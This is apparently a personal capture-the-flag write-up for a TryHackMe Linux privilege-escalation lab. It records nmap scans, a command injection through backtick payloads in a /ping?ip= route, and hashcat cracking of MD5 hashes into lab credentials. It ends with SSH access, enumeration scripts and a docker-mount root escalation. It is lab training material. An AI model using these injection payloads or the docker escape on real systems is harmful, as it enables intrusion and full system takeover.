# Matheus Jesus 11-04-2020

## Try Hack Me - Linux Privesc Playground (https://tryhackme.com/room/privescplayground)

### IP 10.10.173.59

#### NMAP

nmap -sC -sV -oN nmap_initial 10.10.173.59

checkout all ports
nmap -sC -sV -p-65535 -oN nmap_initial 10.10.173.59

#### 8081 Node.js server

There is an /auth route with params user and password

Found a /ping?ip={IP} route
EXPLOITABLE WITH COMMAND INJECTIO

/ping?ip=`ls` responds ping: utech.db.sqlite: Name or service not known 

by executing ping?ip=`cat utech.db.sqlite`
f357a0c52799563c7c7b76c1e7543a32

hashcat -m 0 -a 0 f357a0c52799563c7c7b76c1e7543a32 /usr/share/wordlists/rockyou.txt --force

Mr00t:n100906
f357a0c52799563c7c7b76c1e7543a32:n100906

Madmin:mrsheafy
0d0ea5111e3c1def594c1684e3b9be84:mrsheafy

#### 31331 Apache server

There is a /partners.html route to login through auth api on 8081

#### SSH

access machine with ssh r00t@10.10.173.59 : n100906

#### Privilege escalation

Enumeration
scp /opt/linPEAR/linpeas.sh r00t@10.10.173.59:/dev/shm
scp /opt/linEnum/linEnum.sh r00t@10.10.173.59:/dev/shm

Docker privilege escalation

docker run -v /:/mnt --rm -it bash chroot /mnt sh